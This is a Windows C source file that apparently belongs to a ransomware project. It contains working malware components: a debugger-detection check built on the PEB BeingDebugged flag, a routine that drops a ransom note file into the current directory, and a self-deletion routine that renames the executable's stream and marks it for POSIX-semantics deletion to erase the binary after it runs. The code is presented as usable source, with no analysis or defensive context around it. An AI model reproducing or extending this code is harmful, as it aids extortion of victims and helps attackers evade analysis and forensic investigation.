#include <Windows.h>
#include "peb.h"
#include "memutils.h"
#include "stringshims.h"
#include "crypto.h"
#include "antianalysis.h"

#ifdef DBG_EVASION
BOOL IsBeingDebugged() {
    PPEB pPeb = GetPeb();
    if (pPeb->BeingDebugged == 1)
        return TRUE;
    else
        return FALSE;
}
#endif


BOOL WriteTextFile(LPCSTR wNote) {
    BOOL    bResult = FALSE;
    HANDLE  hFile = INVALID_HANDLE_VALUE;
    WCHAR   wCurrentDir[MAX_PATH];
    DWORD   dwDirBytesWritten = GetCurrentDirectoryW(MAX_PATH, wCurrentDir);
    DWORD   dwFileBytesWritten;

    if (dwDirBytesWritten == 0 || dwDirBytesWritten > MAX_PATH - shim_wcslen(RANSOM_NOTE_FILENAME))
        goto CLEANUP;

    shim_wcscat(wCurrentDir, MAX_PATH, RANSOM_NOTE_FILENAME);

    if ((hFile = CreateFileW(wCurrentDir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!WriteFile(hFile, wNote, (DWORD)shim_strlenA(wNote), &dwFileBytesWritten, NULL))
        goto CLEANUP;

    bResult = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);
    return bResult;
}


BOOL DeleteSelfFromDisk() {
    WCHAR wPath[MAX_PATH * 2] = { 0 };
    WCHAR wNewStream[MAX_PATH] = { 0 };
    PFILE_RENAME_INFO pRename = NULL;

    HANDLE hFile = INVALID_HANDLE_VALUE;
    SIZE_T SizeStream;
    SIZE_T SizeRename;
    BOOL   bResult = FALSE;

    shim_wcscpy_s(wNewStream, ARRAYSIZE(wNewStream), L":to_be_deleted");

    if (!GetModuleFileNameW(NULL, wPath, MAX_PATH)) {
        return bResult;
    }

    if ((hFile = CreateFileW(wPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE) {
        return bResult;
    }

    SizeStream = shim_wcslen(wNewStream) * sizeof(WCHAR);
    SizeRename = sizeof(FILE_RENAME_INFO) + SizeStream;

    if (!(pRename = (PFILE_RENAME_INFO)_HeapAlloc(SizeRename))) {
        goto CLEANUP;
    }

    pRename->FileNameLength = (DWORD)SizeStream;
    pRename->ReplaceIfExists = FALSE;
    pRename->RootDirectory = NULL;
    _memcpy(pRename->FileName, wNewStream, SizeStream);

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, (DWORD)SizeRename)) {
        //  printf("SetFileInformationByHandle [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto CLEANUP;
    }

    CloseHandle(hFile);

    if ((hFile = CreateFileW(wPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE) {
        //  printf("CreateFileW [%d] File Failed With Error: %d\n", __LINE__, GetLastError());
        return bResult;
    }

    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
    if (!SetFileInformationByHandle(hFile, FileDispositionInfoEx, &info, sizeof(info))) {
        //  printf("SetFileInformationByHandle [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto CLEANUP;
    }

    //  printf("[+] Self-deletion succeeded!\n");
    bResult = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);
    HEAP_FREE(pRename);

    return bResult;
}


